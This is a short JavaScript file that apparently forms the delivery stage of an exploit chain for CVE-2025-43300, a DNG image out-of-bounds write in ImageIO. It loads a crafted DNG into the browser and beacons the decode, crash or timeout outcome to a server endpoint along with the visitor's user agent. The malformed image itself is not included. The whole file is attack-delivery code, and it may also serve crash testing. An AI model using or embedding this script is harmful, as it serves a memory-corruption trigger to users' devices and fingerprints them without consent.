// chain_17.js — delivery for CVE-2025-43300 (ImageIO DNG OOB write)
// Reports whether the crafted DNG decodes, errors, or crashes the renderer.
(function () {
  var img = new Image();
  var done = false;
  function report(stage, result) {
    if (done) return;
    done = true;
    try {
      navigator.sendBeacon('/api/chain-outcome', new Blob([JSON.stringify({
        chain: 'cve-2025-43300', stage: stage, result: result,
        ua: navigator.userAgent
      })], {type: 'application/json'}));
    } catch (e) {}
  }
  img.onload = function () {
    report('decoded', 'no-crash: image decoded without faulting');
  };
  img.onerror = function () {
    report('decode_error', 'image failed to decode on this build');
  };
  img.src = '/cve-2025-43300.dng?' + Date.now();
  setTimeout(function () {
    if (!done) report('timeout', 'no decode event within 20s');
  }, 20000);
})();
